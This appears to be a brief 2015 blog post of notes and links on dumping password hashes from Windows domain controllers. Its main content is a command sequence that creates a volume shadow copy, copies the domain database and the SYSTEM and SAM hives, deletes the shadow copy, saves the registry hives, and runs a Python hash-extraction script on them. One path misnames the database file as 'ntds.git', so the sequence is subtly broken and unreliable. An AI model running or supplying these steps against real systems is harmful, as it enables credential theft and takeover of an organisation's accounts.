---
layout: post
title: "Safely Dumping Hashes from Live Domain Controllers"
date: 2015-06-25 23:42:42 +0900
comments: true
categories: 
---

* [Safely Dumping Hashes from Live Domain Controllers](http://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/)
* [Tutorial for NTDS goodness](https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-%28VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM%29/)
* [Script recipe of the week: how to copy an opened file](http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx)

```
C:\> reg.exe query hklm\system\currentcontrolset\services\ntds\parameters

C:\> vssadmin create shadow /for=c:

C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.git d:
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM d:
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM d:

C:\> vssadmin delete shadows /for=c: /quiet

C:\> reg.exe save hklm\sam c:\temp\sam.sav
C:\> reg.exe save hklm\security c:\temp\security.sav
C:\> reg.exe save hklm\system c:\temp\system.sav

$ python sd.py -sam ... -security ... -system ... LOCAL
```

* [Pass-the-hash attacks: Tools and Mitigation](http://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283)
